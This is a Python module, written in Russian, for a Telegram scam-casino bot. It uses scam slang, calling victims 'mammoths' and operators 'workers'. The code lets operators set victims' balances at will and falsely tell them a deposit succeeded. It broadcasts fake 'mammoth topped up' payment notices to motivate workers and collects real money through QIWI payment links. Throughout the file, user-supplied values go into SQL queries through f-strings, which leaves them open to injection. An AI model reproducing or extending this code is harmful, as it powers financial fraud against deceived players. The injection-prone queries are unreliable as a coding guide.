import sqlite3
import time
import requests
import random
from casino_config import bot, admin_1, admin_2, min_deposit, admin_chat, conclusion_channel, workers_chat
from casino_keyboard import keyboard_admin, keyboard_worker, keyboard_deposit_methods, del_msg_button



# Рассылка сообщений
def admin_rassilka(message):
    rassilka = message.text
    bot.send_message(message.from_user.id,
                     'Запустить рассылку? Введите "Да", чтобы начать рассылку, либо же "Нет", чтобы отменить ее')
    bot.register_next_step_handler(message, admin_rassilka2, rassilka)


# Рассылка сообщений_2
def admin_rassilka2(message, rassilka):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    if message.text == "Да":
        bot.send_message(message.from_user.id, "Рассылка началась", reply_markup=keyboard_admin())
        for user in get_users_to_mailing():
            try:
                bot.send_message(user[0], f"{rassilka}", reply_markup=del_msg_button(), parse_mode="HTML")
            except:
                pass
        from casino_bot import get_text_message_admin
        bot.register_next_step_handler(message, get_text_message_admin)

    else:
        bot.send_message(message.from_user.id, "Рассылка отменена", reply_markup=keyboard_admin())
        from casino_bot import get_text_message_admin
        bot.register_next_step_handler(message, get_text_message_admin)


# Рассылка сообщений воркерам
def worker_rassilka(message):
    rassilka = message.text
    bot.send_message(message.from_user.id,
                     'Запустить рассылку? Введите "Да", чтобы начать рассылку, либо же "Нет", чтобы отменить ее')
    bot.register_next_step_handler(message, worker_rassilka2, rassilka)


# Рассылка сообщений_2 воркерам
def worker_rassilka2(message, rassilka):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    if message.text == "Да":
        bot.send_message(message.from_user.id, "Рассылка началась", reply_markup=keyboard_admin())
        for user in get_workers_to_mailing():
            try:
                bot.send_message(user[0], f"{rassilka}", reply_markup=del_msg_button(), parse_mode="HTML")
            except:
                pass
        from casino_bot import get_text_message_admin
        bot.register_next_step_handler(message, get_text_message_admin)

    else:
        bot.send_message(message.from_user.id, "Рассылка отменена", reply_markup=keyboard_admin())
        from casino_bot import get_text_message_admin
        bot.register_next_step_handler(message, get_text_message_admin)

# Изменение баланса
def chan_balance(message):

    try:
        id = int(message.text)
        bot.send_message(message.from_user.id, "Введите, какой баланс сделать человеку")
        bot.register_next_step_handler(message, chan_balance_2, id)

    except:
       if message.chat.id == admin_1 or message.chat.id == admin_2:

        bot.send_message(message.from_user.id, "Вы вернулись в меню админа", reply_markup=keyboard_admin())
        from casino_bot import get_text_message_admin
        bot.register_next_step_handler(message, get_text_message_admin)

       else:

           bot.send_message(message.from_user.id, "Вы вернулись в меню воркера", reply_markup=keyboard_worker())
           from casino_bot import get_text_message_worker
           bot.register_next_step_handler(message, get_text_message_worker)



# Изменение баланса_2
def chan_balance_2(message, id):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    try:
        balance = int(message.text)
        id = id

        cur.execute(f"UPDATE users SET balance = {balance} WHERE id = {id}")
        con.commit()
        if message.chat.id == admin_1 or message.chat.id == admin_2:

            bot.send_message(id, f"Ваш баланс успешно пополнен и составляет: {balance}₽")
            bot.send_message(message.from_user.id, "Баланс успешно изменен", reply_markup=keyboard_admin())

            from casino_bot import get_text_message_admin

            bot.register_next_step_handler(message, get_text_message_admin)


        else:
            bot.send_message(id, f"Ваш баланс успешно пополнен и составляет: {balance}₽")
            bot.send_message(message.from_user.id, "Баланс успешно изменен", reply_markup=keyboard_worker())

            from casino_bot import get_text_message_worker

            bot.register_next_step_handler(message, get_text_message_worker)

    except:
        if message.chat.id == admin_1 or message.chat.id == admin_2:

            bot.send_message(message.from_user.id, "Вы вернулись в меню админа", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)

        else:

            bot.send_message(message.from_user.id, "Вы вернулись в меню воркера", reply_markup=keyboard_worker())
            from casino_bot import get_text_message_worker
            bot.register_next_step_handler(message, get_text_message_worker)


# Изменение статуса
def chan_status(message):

    try:
        id = int(message.text)
        if get_user_id(id) != None:
            bot.send_message(message.from_user.id,
                             "Введите, какой статус сделать человеку (0 - Премиум, 1 - Азарт) * Лучше вообще не трогать")
            bot.register_next_step_handler(message, chan_status_2, id)
        else:
            bot.send_message(message.from_user.id, "Пользоваетля с таким id нет в базе данных", reply_markup=keyboard_admin())
    except:

            bot.send_message(message.from_user.id, "Вы вернулись в меню админа", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)




# Изменение статуса_2
def chan_status_2(message, id):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    try:
        status = int(message.text)
        id = id
        if status == 0 or status == 1 or status == 2:

            try:
                cur.execute(f"UPDATE users SET status = {status} WHERE id = {id}")
                con.commit()
                bot.send_message(message.from_user.id, "Статус успешно изменен",  reply_markup=keyboard_admin())
                from casino_bot import get_text_message_admin
                bot.register_next_step_handler(message, get_text_message_admin)
            except:
                bot.send_message(message.from_user.id, "Вы вернулись в меню админа",  reply_markup=keyboard_admin())
                from casino_bot import get_text_message_admin
                bot.register_next_step_handler(message, get_text_message_admin)

        else:
            bot.send_message(message.from_user.id, "Такой статус невозможно сделать",  reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)

    except:

        bot.send_message(message.from_user.id, "Вы вернулись в меню админа", reply_markup=keyboard_admin())

        from casino_bot import get_text_message_admin

        bot.register_next_step_handler(message, get_text_message_admin)


def fake_payment(message):

    try:
        amount = int(message.text)
        bot.send_message(message.from_user.id, "Введите id воркера")
        bot.register_next_step_handler(message, fake_payment_2, amount)

    except:
        
        if message.chat.id == admin_1 or message.chat.id == admin_2:
            bot.send_message(message.from_user.id, "Вы вернулись в меню админа", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)


def fake_payment_2(message, amount):

    try:
        id = int(message.text)
        if check_worker(id) != None:
            bot.send_message(message.from_user.id, "Введите комиссию с залёта")
            bot.register_next_step_handler(message, fake_payment_3, amount, id)
        else:
            bot.send_message(message.from_user.id, "Воркер с таким id не найдено", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)

    except:
        
        if message.chat.id == admin_1 or message.chat.id == admin_2:
            bot.send_message(message.from_user.id, "Вы вернулись в меню админа", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)


def fake_payment_3(message, amount, id):

    try:
        comission = int(message.text)
        bot.send_message(message.from_user.id, "Для подтверждения действия введите 'Да'")

        bot.register_next_step_handler(message, fake_payment_4, amount, id, comission)

    except:
        
        if message.chat.id == admin_1 or message.chat.id == admin_2:
            bot.send_message(message.from_user.id, "Вы вернулись в меню админа", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)

def fake_payment_4(message, amount, id, comission):

    try:
        answer = message.text
        if answer == "Да":
            username = get_worker_username(id)
            bot.send_message(admin_chat,
                                    f"ФЕЙК ЗАЛЁТ\n"
                                    f"💰МАМОНТ ПОПОЛНИЛ БАЛАНС💰  \n"
                                    f"🎅Воркер: @{username}🎅\n"
                                    f"🎄Сумма: {amount}₽ 🎄\n")
            bot.send_message(conclusion_channel,
                                    f"💰МАМОНТ ПОПОЛНИЛ БАЛАНС💰  \n"
                                    f"🎅Воркер: @{username} 🎅\n"
                                    f"🎄Сумма: {amount}₽ 🎄\n"
                                    f"❄️ДОЛЯ ВОРКЕРА: {round(amount-amount/100*comission)}₽ ❄️\n"
                                    f"✅СТАТУС: 🔁На выплате\n")

            bot.send_message(workers_chat,
                                    f"💰МАМОНТ ПОПОЛНИЛ БАЛАНС💰  \n"
                                    f"🎅Воркер: @{username} 🎅\n"
                                    f"🎄Сумма: {amount}₽ 🎄\n")
            add_payment(id, amount)
            bot.send_message(message.from_user.id, "Фейк платеж отправлен", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)
        else:
            bot.send_message(message.from_user.id, "Фейк платеж отменен", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)
    except Exception as e:
        print(e)
        if message.chat.id == admin_1 or message.chat.id == admin_2:
            bot.send_message(message.from_user.id, "Вы вернулись в меню админа", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)



# Изменение статуса
def chan_status_worker(message):
    try:
        id = int(message.text)
        if get_user_id(id) != None:
            bot.send_message(message.from_user.id,
                             "Введите, какой статус сделать человеку (0 - Премиум, 1 - Азарт) * Лучше вообще не трогать")
            bot.register_next_step_handler(message, chan_status_worker_2, id)
        else:
            bot.send_message(message.from_user.id, "Пользоваетля с таким id нет в базе данных", reply_markup=keyboard_worker())
    except:

            bot.send_message(message.from_user.id, "Вы вернулись в меню воркера", reply_markup=keyboard_worker())
            from casino_bot import get_text_message_worker
            bot.register_next_step_handler(message, get_text_message_worker)




# Изменение статуса_2
def chan_status_worker_2(message, id):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    try:
        status = int(message.text)
        id = id
        if status == 0 or status == 1 or status == 2:

            try:
                cur.execute(f"UPDATE users SET status = {status} WHERE id = {id}")
                con.commit()
                bot.send_message(message.from_user.id, "Статус успешно изменен",  reply_markup=keyboard_worker())
                from casino_bot import get_text_message_worker
                bot.register_next_step_handler(message, get_text_message_worker)
            except:
                bot.send_message(message.from_user.id, "Вы вернулись в меню воркера",  reply_markup=keyboard_worker())
                from casino_bot import get_text_message_worker
                bot.register_next_step_handler(message, get_text_message_worker)

        else:
            bot.send_message(message.from_user.id, "Такой статус невозможно сделать",  reply_markup=keyboard_worker())
            from casino_bot import get_text_message_worker
            bot.register_next_step_handler(message, get_text_message_worker)

    except:

        bot.send_message(message.from_user.id, "Вы вернулись в меню воркера", reply_markup=keyboard_worker())

        from casino_bot import get_text_message_worker

        bot.register_next_step_handler(message, get_text_message_worker)


# Сделать воркером
def ins_workers(message):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()

    try:
        id = int(message.text)
        if check_worker(id) == None:
            cur.execute(f"INSERT INTO workers (id, payments_amount, payments_sum, username, first_name) VALUES (\"{id}\", 0, 0, 0, 0)")
            con.commit()
            bot.send_message(message.from_user.id, "Воркер успешно добавлен", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)
        else:
            bot.send_message(message.from_user.id, "Этот пользователь уже воркер", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)
    except:
        bot.send_message(message.from_user.id, "Вы вернулись в меню админа", reply_markup=keyboard_admin())
        from casino_bot import get_text_message_admin
        bot.register_next_step_handler(message, get_text_message_admin)


# Удалить из воркеров
def del_workers(message):
    con = sqlite3.connect("dannie_2.db")
    cur = con.cursor()
    try:
        id = int(message.text)
        if check_worker(id) != None:
            cur.execute(f"DELETE FROM workers WHERE id = {id}")
            con.commit()
            bot.send_message(message.from_user.id, "Воркер успешно удален", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)
        else:
            bot.send_message(message.from_user.id, "Этот пользователь не является воркером", reply_markup=keyboard_admin())
            from casino_bot import get_text_message_admin
            bot.register_next_step_handler(message, get_text_message_admin)
    except:
        bot.send_message(message.from_user.id, "Вы вернулись в меню админа", reply_markup=keyboard_admin())
        from casino_bot import get_text_message_admin
        bot.register_next_step_handler(message, get_text_message_admin)

#Получить ссылку на оплату
def get_payment_url(code, number, amount):
    s = requests.Session()
    parameters = {"extra['comment']": code, "extra['account']": number, "amountInteger": amount, "amountFraction": 00, "blocked[0]": 'comment', "blocked[1]": 'account', "blocked[2]": 'sum'}
    url = 'https://qiwi.com/payment/form/99'
    h = s.get(url,params = parameters)
    return h.url

#Получить комментарий
def get_comment(id):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT qiwi_comment FROM users WHERE id = '{id}' ''')
    row = cursor.fetchone()[0]
    return row

#Обновить комментарий
def add_deposit(id):
    comment = random.randint(1111, 9999)
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''UPDATE users SET qiwi_comment = {comment} WHERE id = '{id}' ''')
    cursor.close()
    db.commit()

#Получить последние пополнения
def deposit_check(number, token, rows_num):
    s = requests.Session()
    s.headers['authorization'] = 'Bearer ' + token
    parameters = {'rows': rows_num, 'operation': 'IN'}
    h = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + number + '/payments', params = parameters)
    return h.json()

#Проверка пополнения
def check_deposit(id, number, token, rows_num):
    comment = get_comment(id)
    payments = deposit_check(number, token, rows_num)
    pay_len = len(payments['data'])
    if rows_num > pay_len:
        rows_num = pay_len
    for i in range(rows_num):
        if payments['data'][i]['comment'] == str(comment):
            amount = payments['data'][i]['sum']['amount']
            return True, amount
    return False, 0


#Получить баланс
def get_user_balance(id):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT balance FROM users WHERE id = '{id}' ''')
    balance = cursor.fetchone()[0]
    return balance

#Обновить баланс
def add_balance(id, amount):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    balance = get_user_balance(id)
    balance += amount
    cursor.execute(f'''UPDATE users SET balance = '{balance}' WHERE id = '{id}' ''')
    db.commit()

#Обновление суммы пополнения
def update_deposit_amount(id, amount):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''UPDATE users SET deposit_amount = '{amount}' WHERE id = '{id}' ''')
    db.commit()

#Получение суммы пополнения
def get_deposit_amount(id):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT deposit_amount FROM users WHERE id = '{id}' ''')
    row = cursor.fetchone()[0]
    return row

def deposit1(message):
    try:
        deposit_amount = int(message.text)
        if deposit_amount >= min_deposit:
            update_deposit_amount(message.from_user.id, deposit_amount)
            bot.send_message(message.from_user.id, "Выберите метод пополнения",
                                reply_markup=keyboard_deposit_methods()
                                 )
        else:
            bot.send_message(message.from_user.id, "Минимальная сумма пополнения 200 рублей")
    except:
        bot.send_message(message.from_user.id, "Вводите цифрами!\nНапример: 500")

def get_users_to_mailing():
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT id FROM users ''')
    row = cursor.fetchall()
    return row

def get_workers_to_mailing():
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT id FROM workers ''')
    row = cursor.fetchall()
    return row

def check_worker(id):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT id FROM workers WHERE id = '{id}' ''')
    row = cursor.fetchone()
    return row

def add_conclusion(amount, worker, mamont_id, id):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    conclusion = [amount, id, worker, mamont_id]
    cursor.execute(f'''INSERT INTO conclusions(amount, id, worker, mamont_id) VALUES(?,?,?,?)''', conclusion)
    db.commit()

def get_conclusion(id):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT * FROM conclusions WHERE id = '{id}' ''')
    row = cursor.fetchone()
    return row

def get_boss(id):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT boss FROM users WHERE id = '{id}' ''')
    row = cursor.fetchone()[0]
    return row

def get_username(id):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT username FROM users WHERE id = '{id}' ''')
    row = cursor.fetchone()
    return row

def update_username(id, username):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''UPDATE users SET username = '{username}' WHERE id = '{id}' ''')
    db.commit()

def get_user_id(id):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT id FROM users WHERE id = '{id}' ''')
    row = cursor.fetchone()
    return row

def get_referals_id(id):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT id, name, username, balance FROM users WHERE boss = '{id}' ''')
    row = cursor.fetchall()
    return row

def get_mamonts(id):
    text = ""
    for user in get_referals_id(id):
        text += f"{user[0]} || {user[1]} || @{user[2]}|| {user[3]} \n"
    return text

def get_worker(id):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT * FROM workers WHERE id = '{id}' ''')
    row = cursor.fetchall()[0]
    return row


def get_top_workers():
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''
        SELECT * FROM workers
        WHERE payments_sum>0
        ORDER BY payments_sum DESC
        ''')
    row = cursor.fetchall()
    return row

def update_worker_username(id, username):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''UPDATE workers SET username = '{username}' WHERE id = '{id}' ''')
    db.commit()

def get_worker_username(id):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT username FROM workers WHERE id = '{id}' ''')
    row = cursor.fetchone()[0]
    return row

def update_first_name(id, first_name):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''UPDATE workers SET first_name = '{first_name}' WHERE id = '{id}' ''')
    db.commit()

def add_payment(id, amount):
    db = sqlite3.connect('dannie_2.db')
    cursor = db.cursor()
    cursor.execute(f'''SELECT payments_amount, payments_sum FROM workers WHERE id = '{id}' ''')
    result = cursor.fetchone()
    if result != None:
        user = list(result)
        user[0] += 1
        user[1] += amount
        cursor.execute(f'''UPDATE workers SET payments_amount = '{user[0]}' WHERE id = '{id}' ''')
        db.commit()
        cursor.execute(f'''UPDATE workers SET payments_sum = '{user[1]}' WHERE id = '{id}' ''')
        db.commit()
